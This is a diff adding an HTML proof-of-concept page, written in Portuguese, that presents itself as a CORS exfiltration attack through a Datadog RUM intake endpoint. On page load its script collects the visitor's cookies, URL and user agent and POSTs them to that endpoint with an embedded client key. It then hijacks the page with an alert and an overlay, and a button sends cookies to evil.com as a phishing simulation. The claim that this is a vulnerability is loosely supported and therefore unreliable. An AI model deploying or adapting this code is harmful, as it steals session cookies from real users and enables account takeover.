@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>POC Avançada: Exfiltração CORS + Impacto DOM</title>
+</head>
+<body>
+    <h1>POC Avançada - Exfiltração via RUM + Alteração da Página</h1>
+    
+    <p>Esta versão captura dados reais (cookies, URL, location) e os envia via POST. Após sucesso, altera o DOM (alerta + overlay + redirecionamento simulado).</p>
+    
+    <!-- Elemento para exibir impacto -->
+    <div id="impact-zone" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.8); color: white; text-align: center; z-index: 9999;">
+        <h2>ATAQUE BEM-SUCEDIDO! Dados Exfiltrados.</h2>
+        <p>ID de Confirmação: <span id="exfiltrated-id"></span></p>
+        <p>Cookies Roubados: <span id="stolen-cookies"></span></p>
+        <button onclick="location.href='https://evil.com?data='+encodeURIComponent(document.cookie)">Clique para "Recuperar" (Simulação de Phishing)</button>
+    </div>
+    
+    <script>
+        const VULNERABLE_URL = 'https://browser-intake-datadoghq.com/api/v2/rum?ddsource=browser&dd-api-key=pub75ad0c3b08ce2dd249e3dba1791bca84&dd-evp-origin-version=6.22.0&dd-evp-origin=browser&dd-request-id=5ad94e5a-ec5c-4525-b732-7af8232bacd3&batch_time=1761064984867&_dd.api=fetch-keepalive'; 
+
+        // Captura dados reais para exfiltração
+        const userData = {
+            cookies: document.cookie || 'Nenhum cookie',
+            currentUrl: window.location.href,
+            userAgent: navigator.userAgent,
+            // Simula geolocalização (em real, peça permissão via navigator.geolocation)
+            location: 'Simulada: 37.7749,-122.4194 (SF, CA)'
+        };
+
+        const PAYLOAD = JSON.stringify({
+            "rum": [
+                {
+                    "date": Date.now(),
+                    "message": "EXFIL: Dados Roubados via CORS",
+                    "status": "error", // Para destacar no log Datadog
+                    "data": userData // Exfiltração: envia dados sensíveis!
+                }
+            ]
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            fetch(VULNERABLE_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: PAYLOAD
+            })
+            .then(response => {
+                if (response.status !== 0) {
+                    document.getElementById('status').innerText = `SUCESSO: Exfiltração Confirmada! (Status: ${response.status})`;
+                    return response.text();
+                } else {
+                    throw new Error('Falha na requisição');
+                }
+            })
+            .then(data => {
+                const responseJson = JSON.parse(data || '{}');
+                const requestId = responseJson.request_id || 'Desconhecido';
+                
+                // AFETA A PÁGINA DE VERDADE:
+                // 1. Alerta com dados exfiltrados
+                alert(`Dados exfiltrados para Datadog!\nID: ${requestId}\nCookies: ${userData.cookies}`);
+                
+                // 2. Muda título da página
+                document.title = `HACKED: ${requestId}`;
+                
+                // 3. Injeta overlay malicioso (sequestra visual da página)
+                const impactZone = document.getElementById('impact-zone');
+                document.getElementById('exfiltrated-id').innerText = requestId;
+                document.getElementById('stolen-cookies').innerText = userData.cookies;
+                impactZone.style.display = 'block';
+                
+                console.log('Exfiltração + DOM Hijack:', { requestId, stolen: userData });
+            })
+            .catch(error => {
+                document.getElementById('status').innerText = 'FALHA: ' + error.message;
+                console.error('Erro:', error);
+            });
+        });
+    </script>
+    
+    <h2>Status da Exfiltração:</h2>
+    <p id="status">Iniciando exfiltração e hijack DOM...</p>
+    
+</body>
+</html>
